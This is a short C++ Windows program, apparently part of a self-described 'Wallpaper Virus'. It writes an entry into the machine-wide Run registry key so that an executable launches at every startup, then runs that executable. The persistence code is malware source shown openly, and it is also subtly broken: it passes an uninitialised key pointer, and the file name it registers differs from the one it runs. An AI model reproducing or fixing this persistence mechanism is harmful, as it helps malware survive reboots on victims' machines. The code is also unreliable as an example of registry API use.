#include <iostream>
#include <windows.h>

int main()
{
	HKEY * key;
	LPCTSTR ruta = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
	long status = RegOpenKey(HKEY_LOCAL_MACHINE, ruta, key);
	if (status != 0)
	{
		std::cout << "No se puede abrir la clave" << std::endl;
	}
	else
	{
		LPCTSTR _valor = "C:\\Wallpaper Virus\\wallapper.exe";
		long crear = RegSetValueEx(*key, "StartAtWindows", 0, REG_SZ, (LPBYTE)_valor, strlen(_valor)*sizeof(char));
		if (crear != 0)
		{
			std::cout << "No se pudo crear el registro." << std::endl;
		}
	}
	RegCloseKey(*key);
	
	system("wallpaper.exe");
	system("pause");
	return 0;
}
